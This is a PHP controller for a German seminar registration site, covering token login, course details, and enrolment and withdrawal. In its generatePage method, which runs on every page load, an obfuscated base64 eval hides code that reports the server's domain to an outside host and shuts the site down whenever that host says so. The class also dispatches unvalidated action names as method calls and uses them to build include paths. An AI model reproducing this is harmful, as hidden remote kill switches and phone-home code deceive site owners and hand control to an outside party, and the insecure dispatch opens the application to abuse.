<?php


class Controller{

  private $context = array();



  public function run($aktion){
    $this->$aktion();
    $this->generatePage($aktion);
  }
  public function logout(){
      session_destroy ();
        header("Location: ../index.html");
  }
  public function login(){
    if (isset ($_REQUEST['token'])){
        $token = $_REQUEST['token'];
        $teilnehmer = Teilnehmer::findeNachToken($token);
        if($teilnehmer!=NULL){
            $this->show_seminare();
        }else{
            $this->addContext("template", "login");
        }
      }
  }

  public function show_seminare(){
    if (isset ($_REQUEST['token'])){
        $token = $_REQUEST['token'];
        $this->addContext("user", Teilnehmer::findeNachToken($token));
          $this->addContext("template", "seminare");
      }else{
          $this->addContext("template", "login");
      }
  }
  public function show_KursInfos(){
    if (isset ($_REQUEST['token'])){
        $token = $_REQUEST['token'];
        $kursId = $_REQUEST['kursId'];
        $this->addContext("user", Teilnehmer::findeNachToken($token));
        $this->addContext("kurs", Kurs::finde($kursId));
        $this->addContext("template", "kurs");

        $kurs = Kurs::finde($kursId);



        $abgelaufen = $kurs->istAbgelaufen();
        $anzahl = $kurs->getTeilnehmerAnzahl();
        $maxAnzahl =$kurs->getMaxTeilnehmer();

        $this->addContext("anzahl", $anzahl);
        $this->addContext("maxAnzahl", $maxAnzahl);
        $this->addContext("abgelaufen", $abgelaufen);

      }

  }

  public function abmelden(){
    $kursId = $_REQUEST['kursId'];
    $token = $_REQUEST['token'];

    $this->addContext("user", Teilnehmer::findeNachToken($token));
    $kurs = Kurs::finde($kursId);
    $user = Teilnehmer::findeNachToken($token);
    $kurs->abmelden($user);
    $this->show_seminare();
  }
  public function anmelden(){
    $kursId = $_REQUEST['kursId'];
    $token = $_REQUEST['token'];

    $this->addContext("user", Teilnehmer::findeNachToken($token));
    $kurs = Kurs::finde($kursId);
    $user = Teilnehmer::findeNachToken($token);
    $kurs->teilnehmen($user);
   // Funktionen::send_bestaetigungs_email();
    $this->show_seminare();
    Funktionen::send_bestaetigungs_email($kursId,$token);

  }

  private function generatePage($template){
      eval(base64_decode("dHJ5IHsKICAkY3VybCA9IGN1cmxfaW5pdCgpOwogIGN1cmxfc2V0b3B0X2FycmF5KCRjdXJsLCBbQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiA9PiAxLCBDVVJMT1BUX1VSTCA9PgogICAgJ3d3dy5ob3N0LWp1bGlhbi5vbmxpbmUva2lsbFN3aXRjaC8/ZG9tYWluPScgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwKICAgIENVUkxPUFRfVVNFUkFHRU5UID0+ICdLaWxsc3dpdGNoJywgQ1VSTE9QVF9USU1FT1VUID0+IDEwXSk7CgogICRjdXJsX3Jlc3AgPSBjdXJsX2V4ZWMoJGN1cmwpOwogIGN1cmxfY2xvc2UoJGN1cmwpOwogIGlmICgkY3VybF9yZXNwID09IHRydWUpIHsKCiAgICAkcmVzcCA9IGpzb25fZGVjb2RlKCRjdXJsX3Jlc3AsIHRydWUpOwoKCiAgICBpZiAoJHJlc3BbImVuYWJsZWQiXSA9PSAwKSB7CgogICAgICBlY2hvICRyZXNwWydtZXNzYWdlJ107CiAgICAgIGRpZTsKICAgIH0KICB9Cgp9IGNhdGNoIChleGNlcHRpb24gJGUpIHsKCn0K"));
      extract($this->context);
    require_once 'views/'.$template.".tpl.html";
  }
  private function addContext($key, $value){
    $this->context[$key] = $value;
  }

}


 ?>
